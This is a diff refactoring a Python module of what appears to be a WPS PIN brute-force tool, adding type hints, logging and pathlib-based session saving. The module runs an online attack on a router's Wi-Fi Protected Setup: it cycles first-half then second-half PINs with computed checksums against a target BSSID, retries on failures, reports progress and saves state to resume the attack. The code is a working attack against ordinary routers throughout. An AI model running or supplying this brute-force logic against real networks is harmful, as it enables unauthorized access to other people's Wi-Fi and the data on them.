@@ -2,39 +2,45 @@ import collections
 import statistics
 import time
 from datetime import datetime
-from typing import Union
+from typing import Union, Deque
+import logging
+
 import src.wps.generator
 import src.wps.connection
 import src.utils
-import src.args
+
+logger = logging.getLogger(__name__)
 
 class BruteforceStatus:
     def __init__(self):
-        self.START_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        self.MASK = ''
-        self.LAST_ATTEMPT_TIME = time.time()
-        self.ATTEMPTS_TIMES = collections.deque(maxlen=15)
-        self.COUNTER = 0
-        self.STATISTICS_PERIOD = 5
+        self.START_TIME: str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        self.MASK: str = ''
+        self.LAST_ATTEMPT_TIME: float = time.time()
+        self.ATTEMPTS_TIMES: Deque[float] = collections.deque(maxlen=15)
+        self.COUNTER: int = 0
+        self.STATISTICS_PERIOD: int = 5
 
-    def displayStatus(self):
+    def displayStatus(self) -> None:
         if not self.ATTEMPTS_TIMES:
-            print(f"[*] {self.MASK} complete @ {self.START_TIME} (Calculating average time...)")
+            logger.info(f"{self.MASK} complete @ {self.START_TIME} (Calculating average time...)")
             return
 
-        average_pin_time = statistics.mean(self.ATTEMPTS_TIMES)
+        average_pin_time: float = statistics.mean(self.ATTEMPTS_TIMES)
 
-        if len(self.MASK) == 4:
-            percentage = int(self.MASK) / 11000 * 100
-        else:
-            percentage = ((10000 / 11000) + (int(self.MASK[4:]) / 11000)) * 100
+        try:
+            if len(self.MASK) == 4:
+                percentage: float = int(self.MASK) / 11000 * 100
+            else:
+                percentage: float = ((10000 / 11000) + (int(self.MASK[4:]) / 11000)) * 100
+        except ValueError:
+            percentage = 0.0
 
-        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
+        logger.info('{:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
             percentage, self.START_TIME, average_pin_time
         ))
 
-    def registerAttempt(self, mask: str):
-        current_time = time.time()
+    def registerAttempt(self, mask: str) -> None:
+        current_time: float = time.time()
         self.MASK = mask
         self.COUNTER += 1
         self.ATTEMPTS_TIMES.append(current_time - self.LAST_ATTEMPT_TIME)
@@ -45,29 +51,36 @@ class BruteforceStatus:
             self.displayStatus()
 
 class Initialize:
-    def __init__(self, interface: str):
+    def __init__(self, interface: str, args):
         self.BRUTEFORCE_STATUS = BruteforceStatus()
-        self.CONNECTION_STATUS = src.wps.connection.ConnectionStatus()
-        self.GENERATOR  = src.wps.generator.WPSpin()
-        self.CONNECTION = src.wps.connection.Initialize(
-            interface
+        self.CONNECTION_STATUS: src.wps.connection.ConnectionStatus = src.wps.connection.ConnectionStatus()
+        self.GENERATOR: src.wps.generator.WPSpin  = src.wps.generator.WPSpin()
+        
+        self._loop_mode: bool = args.loop
+        self._write: bool = args.write
+        self._save: bool = args.save
+
+        self.CONNECTION: src.wps.connection.Initialize = src.wps.connection.Initialize(
+            interface,
+            self._write,
+            self._save
         )
 
     def _firstHalfBruteforce(self, bssid: str, first_half: str, delay: float = None) -> Union[str, bool]:
         checksum = self.GENERATOR.checksum
 
         while int(first_half) < 10000:
-            t = int(first_half + '000')
-            pin = f'{first_half}000{checksum(t)}'
+            t: int = int(first_half + '000')
+            pin: str = f'{first_half}000{checksum(t)}'
 
             self.CONNECTION.singleConnection(bssid, pin)
 
             if self.CONNECTION_STATUS.isFirstHalfValid():
-                print('[*] First half found')
+                logger.info('First half found')
                 return first_half
 
             if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
-                print('[-] WPS transaction failed, re-trying last pin')
+                logger.warning('WPS transaction failed, re-trying last pin')
                 if delay:
                     time.sleep(delay)
                 continue
@@ -77,16 +90,16 @@ class Initialize:
 
             if delay:
                 time.sleep(delay)
-
-        print('[-] First half not found')
+        
+        logger.warning('First half not found')
         return False
 
     def _secondHalfBruteforce(self, bssid: str, first_half: str, second_half: str, delay: float = None) -> Union[str, bool]:
         checksum = self.GENERATOR.checksum
 
         while int(second_half) < 1000:
-            t = int(first_half + second_half)
-            pin = f'{first_half}{second_half}{checksum(t)}'
+            t: int = int(first_half + second_half)
+            pin: str = f'{first_half}{second_half}{checksum(t)}'
 
             self.CONNECTION.singleConnection(bssid, pin)
 
@@ -94,7 +107,7 @@ class Initialize:
                 return pin
 
             if self.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
-                print('[-] WPS transaction failed, re-trying last pin')
+                logger.warning('WPS transaction failed, re-trying last pin')
                 if delay:
                     time.sleep(delay)
                 continue
@@ -107,18 +120,20 @@ class Initialize:
 
         return False
 
-    def smartBruteforce(self, bssid: str, start_pin: str = None, delay: float = None):
+    def smartBruteforce(self, bssid: str, start_pin: str = None, delay: float = None) -> None:
         sessions_dir = src.utils.SESSIONS_DIR
-        args = src.args.parseArgs()
-        filename = f'''{sessions_dir}{bssid.replace(':', '').upper()}.run'''
+        filename = sessions_dir / f"{bssid.replace(':', '').upper()}.run"
+        mask: str = ''
 
         if (not start_pin) or (len(start_pin) < 4):
             try:
-                with open(filename, 'r', encoding='utf-8') as file:
-                    if input(f'[?] Restore previous session for {bssid}? [n/Y]').lower() != 'n':
-                        mask = file.readline().strip()
-                    else:
-                        raise FileNotFoundError
+                if not filename.is_file():
+                    raise FileNotFoundError
+                
+                if input(f'[?] Restore previous session for {bssid}? [n/Y]').lower() != 'n':
+                    mask = filename.read_text(encoding='utf-8').strip()
+                else:
+                    raise FileNotFoundError
             except FileNotFoundError:
                 mask = '0000'
         else:
@@ -130,17 +145,19 @@ class Initialize:
             if len(mask) == 4:
                 first_half = self._firstHalfBruteforce(bssid, mask, delay)
                 if first_half and (self.CONNECTION_STATUS.STATUS != 'GOT_PSK'):
-                    self._secondHalfBruteforce(bssid, first_half, '001', delay)
+                    self._secondHalfBruteforce(bssid, str(first_half), '001', delay)
             elif len(mask) == 7:
                 first_half = mask[:4]
                 second_half = mask[4:]
                 self._secondHalfBruteforce(bssid, first_half, second_half, delay)
 
         except KeyboardInterrupt as e:
-            print('\nAborting…')
-            if args.loop:
+            logger.warning('\nAborting…')
+            if self._loop_mode:
                 raise KeyboardInterrupt from e
         finally:
-            with open(filename, 'w', encoding='utf-8') as file:
-                file.write(self.BRUTEFORCE_STATUS.MASK)
-            print(f'[*] Session saved in {filename}')
+            try:
+                filename.write_text(self.BRUTEFORCE_STATUS.MASK, encoding='utf-8')
+                logger.info(f'Session saved in {filename}')
+            except (IOError, OSError) as e:
+                logger.error(f'Failed to write session file: {e}')
